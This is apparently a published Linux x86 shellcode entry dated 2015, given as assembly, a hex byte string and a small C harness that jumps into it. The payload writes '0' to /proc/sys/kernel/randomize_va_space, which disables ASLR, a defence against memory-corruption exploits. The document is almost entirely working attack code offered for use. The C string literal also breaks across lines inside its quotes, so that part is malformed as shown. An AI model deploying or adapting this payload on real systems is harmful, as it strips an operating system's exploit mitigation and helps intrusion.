/*
#Title: Disable ASLR in Linux (less byte and more compact)
#Length: 84 bytes
#Date: 3 April 2015
#Author: Mohammad Reza  Ramezani (mr.ramezani.edu@gmail.com - g+)
#Tested On: kali-linux-1.0.6-i386

Thanks to stackoverflow



section .text
global _start

_start:

jmp short fileaddress
shellcode:
pop ebx
xor eax,eax
mov byte [ebx + 35],al
push byte 5
pop eax
push byte 2
pop ecx
int 80h

mov ebx, eax
push byte 4
pop eax
jmp short output
cont:
pop ecx
push byte 2
pop edx
int 80h

push byte 1
pop eax
xor ebx, ebx
int 80h

fileaddress:
call shellcode
db '/proc/sys/kernel/randomize_va_spaceX'

output:
call cont
db '0',10
*/

char shellcode[] = "\xeb\x22\x5b\x31\xc0\x88\x43\x23\x6a\x05\x58"
"\x6a\x02\x59\xcd\x80\x89\xc3\x6a\x04\x58\xeb\x36\x59\x6a\x02\x5a
\xcd\x80\x6a\x01\x58\x31\xdb\xcd\x80\xe8\xd9\xff\xff\xff\x2f\x70
\x72\x6f\x63\x2f\x73\x79\x73\x2f\x6b\x65\x72\x6e\x65\x6c\x2f\x72
\x61\x6e\x64\x6f\x6d\x69\x7a\x65\x5f\x76\x61\x5f\x73\x70\x61\x63
\x65\x58\xe8\xc5\xff\xff\xff\x30\x0a";

int main()
{
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int)shellcode;
}